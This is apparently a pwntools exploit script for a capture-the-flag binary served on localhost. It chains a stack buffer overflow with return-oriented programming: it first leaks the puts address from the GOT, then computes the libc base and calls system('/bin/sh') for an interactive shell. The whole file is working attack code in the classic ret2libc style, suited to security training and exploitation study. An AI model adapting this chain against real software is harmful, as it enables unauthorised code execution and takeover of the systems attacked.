from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(args.BIN, gdbscript=gs, stdin=PTY)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path, stdin=PTY)


p = start()

pop_rdi = 0x000000000000115d
ret = 0x000000000000101a

libc = ELF('./libc.so.6')
# libc = ELF('/usr/lib/libc.so.6')

# Get the puts leak.
p.recvuntil(b'tool, ')
leak = int(p.recvline().split(b'.')[0].decode(), 16)
print(f'Leak at {hex(leak)}')
binbase = leak - 0x4028

print(f'Binary base at {hex(binbase)}')

# Leak GOT address.
payload = flat(
    b'a'*56,
    binbase + pop_rdi,
    binbase + e.got['puts'],
    binbase + e.plt['puts'],
    binbase + ret,
    binbase + e.sym['main']
)
p.recvuntil(b'>>> ')
p.sendline(payload)

putsleak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f'Puts leaked at {hex(putsleak)}')

# Calculate LIBC base.
libcbase = putsleak - libc.sym['puts']
print(f'Libc base at {hex(libcbase)}')
# print(f'Libc base at {hex(fgetsleak - libc.sym['fgets'])}')
# print(f'Libc base at {hex(printfleak - libc.sym['printf'])}')

# Get shell.
p.recvuntil(b'>>> ')
payload = flat(
    b'a'*56,
    binbase + pop_rdi, libcbase + next(libc.search(b'/bin/sh\x00')),
    libcbase + libc.sym['system']
)
p.sendline(payload)

p.interactive()